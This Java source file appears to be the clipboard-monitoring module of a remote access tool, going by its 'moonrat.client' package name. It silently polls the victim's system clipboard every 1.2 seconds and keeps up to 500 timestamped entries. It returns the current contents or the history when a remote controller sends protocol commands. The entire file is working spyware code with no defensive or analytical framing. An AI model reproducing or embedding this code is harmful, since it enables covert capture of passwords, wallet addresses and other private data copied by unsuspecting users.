package moonrat.client.tasks;

import java.awt.GraphicsEnvironment;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.io.IOException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import moonrat.Protocol;
import moonrat.Protocol.Frame;

public final class ClipboardTasks {
    private static final int MAX_ENTRIES = 500;
    private static final int MAX_ENTRY = 8192;
    private static final DateTimeFormatter TIMESTAMP = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");

    private static final Object lock = new Object();
    private static final List<String[]> entries = new ArrayList<>();
    private static volatile boolean running = false;
    private static volatile int trimmed = 0;
    private static Thread watcher;

    private ClipboardTasks() {}

    public static Frame handle(String action, String sinceRaw) {
        Frame response = new Frame(Protocol.CLIP_RESP);
        try {
            switch (action == null ? "" : action) {
                case "start":
                    response.fields = new ArrayList<>(Arrays.asList("", String.valueOf(total()), start()));
                    return response;
                case "stop":
                    response.fields = new ArrayList<>(Arrays.asList("", String.valueOf(total()), stop()));
                    return response;
                case "get":
                    response.fields = new ArrayList<>(Arrays.asList("", String.valueOf(total()), current()));
                    return response;
                case "clear":
                    response.fields = new ArrayList<>(Arrays.asList("", String.valueOf(clear()), "cleared"));
                    return response;
                case "history":
                    response.fields = new ArrayList<>(Arrays.asList("", String.valueOf(total()), history(sinceRaw)));
                    return response;
                default:
                    throw new IOException("unknown action '" + action + "'");
            }
        } catch (Exception failure) {
            response.fields = new ArrayList<>(Arrays.asList(String.valueOf(failure), "", ""));
            return response;
        }
    }

    public static void shutdown() {
        running = false;
        if (watcher != null) watcher.interrupt();
    }

    private static String start() throws Exception {
        if (running) return "already running";
        if (GraphicsEnvironment.isHeadless()) throw new IOException("headless (no display)");

        running = true;
        watcher = new Thread(ClipboardTasks::watch, "clip-watch");
        watcher.setDaemon(true);
        watcher.start();
        return "monitor started";
    }

    private static String stop() {
        running = false;
        if (watcher != null) {
            watcher.interrupt();
            watcher = null;
        }
        return "monitor stopped";
    }

    private static void watch() {
        String last = null;
        while (running) {
            try {
                String content = current();
                if (!content.isBlank() && !content.equals(last)) {
                    last = content;
                    synchronized (lock) {
                        entries.add(new String[] { LocalDateTime.now().format(TIMESTAMP), truncate(content) });
                        if (entries.size() > MAX_ENTRIES) {
                            entries.remove(0);
                            trimmed++;
                        }
                    }
                }
            } catch (Exception ignored) {
            }
            try {
                Thread.sleep(1200);
            } catch (InterruptedException interrupted) {
                return;
            }
        }
    }

    private static String current() throws Exception {
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        if (!clipboard.isDataFlavorAvailable(DataFlavor.stringFlavor)) return "";
        Object data = clipboard.getData(DataFlavor.stringFlavor);
        return data == null ? "" : data.toString();
    }

    private static int total() {
        synchronized (lock) {
            return trimmed + entries.size();
        }
    }

    private static int clear() {
        synchronized (lock) {
            trimmed += entries.size();
            entries.clear();
            return trimmed;
        }
    }

    private static String history(String sinceRaw) {
        int since = parseInt(sinceRaw, 0);
        StringBuilder text = new StringBuilder();

        synchronized (lock) {
            int from = Math.max(since - trimmed, 0);
            for (int index = from; index < entries.size(); index++) {
                String[] entry = entries.get(index);
                if (text.length() + entry[1].length() + 32 > 65536) break;
                text.append('[').append(entry[0]).append("] ").append(entry[1]).append('\n');
            }
        }

        return text.toString();
    }

    private static String truncate(String content) {
        content = content.strip();
        return content.length() <= MAX_ENTRY ? content : content.substring(0, MAX_ENTRY) + "…";
    }

    private static int parseInt(String value, int fallback) {
        try {
            return Integer.parseInt(value);
        } catch (Exception failure) {
            return fallback;
        }
    }
}
